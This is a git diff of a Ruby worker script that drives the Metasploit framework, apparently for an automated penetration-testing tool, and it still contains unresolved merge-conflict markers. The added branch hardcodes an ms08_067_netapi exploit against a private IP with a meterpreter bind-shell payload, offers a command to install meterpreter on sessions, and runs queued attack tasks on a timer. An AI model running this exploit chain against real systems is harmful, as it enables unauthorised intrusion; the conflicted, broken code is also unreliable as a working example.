@@ -2,6 +2,7 @@ require 'rubygems'
 require "#{RAILS_ROOT}/script/worker/loader"
 require "#{RAILS_ROOT}/script/worker/msf_session_event"
 
+<<<<<<< HEAD:script/worker/msf-worker.rb
 require 'drb'
 
 module CommandHandler
@@ -51,6 +52,11 @@ module CommandHandler
       end
     end
 
+=======
+
+class CommandHandler
+  
+>>>>>>> gui_logging:ccserver/script/worker/msf-worker.rb
   def initialize
     puts "Initialize Framework..."
     @framework =  Msf::Simple::Framework.create
@@ -66,8 +72,66 @@ module CommandHandler
 
     handler = MsfSessionEvent.new
     @framework.events.add_session_subscriber(handler)
+<<<<<<< HEAD:script/worker/msf-worker.rb
   end
 
+=======
+    load_plugins
+  end
+  
+  def parse_command _cmd
+    cmd = _cmd.split
+    if commands.has_key? cmd[0].to_s
+      puts "executing #{cmd[0]}"
+      send("cmd_#{cmd[0]}".to_sym, cmd[1..-1])
+    else
+      raise "Unknown Command"
+    end
+  end
+
+  def commands
+    base = {
+        "autopwn" => "Starts Autopwning",
+        "nmap" => "Starts a Nmap Scan",
+        "session_install" => "Install meterpreter on host"
+    }
+  end
+  
+  def cmd_autopwn args
+    # does not work anymore ? 
+    #manager = SubnetManager.new @framework, args[0]
+    #manager.get_sessions
+
+    exploit = @framework.exploits.create("windows/smb/ms08_067_netapi")
+    exploit.datastore['RHOST'] = "192.168.178.34"
+    input        = Rex::Ui::Text::Input::Stdio.new
+    output       = Rex::Ui::Text::Output::Stdio.new
+  	session = exploit.exploit_simple(
+		'Payload'     => "windows/meterpreter/bind_tcp",
+		'LocalInput'  => input,
+		'LocalOutput' => output)
+
+  end
+  
+  def cmd_nmap args
+    manager = SubnetManager.new @framework, args[0]
+    manager.run_nmap
+  end
+
+  def cmd_session_install args
+    if (session = @framework.sessions.get(args[0]))
+      if (session.type == "meterpreter")
+        puts "Install meterpreter on session."
+        install_meterpreter(session)
+      else
+       puts "Selected session is not a meterpreter session"
+      end
+    else
+      puts "No such session found"
+    end
+  end
+  
+>>>>>>> gui_logging:ccserver/script/worker/msf-worker.rb
   def connect_db
     # set the db driver
     @framework.db.driver = DB_SETTINGS["adapter"]
@@ -99,12 +163,46 @@ module CommandHandler
 
     puts "connected to database."
   end
+
+  def tasks_loop
+    Msf::DBManager::Task.find_new_tasks.each do |task|
+      begin
+        task.progress = 1
+        task.save
+        Msf::Plugin::FidiusLogger.task_id = task.id
+        parse_command task.module
+
+        task.progress = 100
+        task.save
+      rescue ::Exception
+        puts("An error occurred while executing task#{task.inspect}: #{$!} #{$!.backtrace}")
+        task.error = $!.inspect
+        task.save
+      end
+    end
+  end
+
+  def load_plugins
+    begin
+      require "#{RAILS_ROOT}/script/worker/msf_payload_loader.rb"
+      @framework.plugins.load("#{RAILS_ROOT}/script/worker/msf_plugins/payload_logger")
+    rescue ::Exception
+      puts("An error occurred while loading plugins: #{$!} #{$!.backtrace}")
+    end
+  end
 end
 end
 
+<<<<<<< HEAD:script/worker/msf-worker.rb
 if not MSF_SETTINGS.select("/drb_url")
   puts "please specify drb_url in msf.yml"
   return
+=======
+$command_handler = CommandHandler.new
+
+EM.run do
+  EventMachine::add_periodic_timer 10, proc{$command_handler.tasks_loop}
+>>>>>>> gui_logging:ccserver/script/worker/msf-worker.rb
 end
 
 DRb.start_service MSF_SETTINGS.select("/drb_url").first.value, CommandHandler::CommandReceiver.new
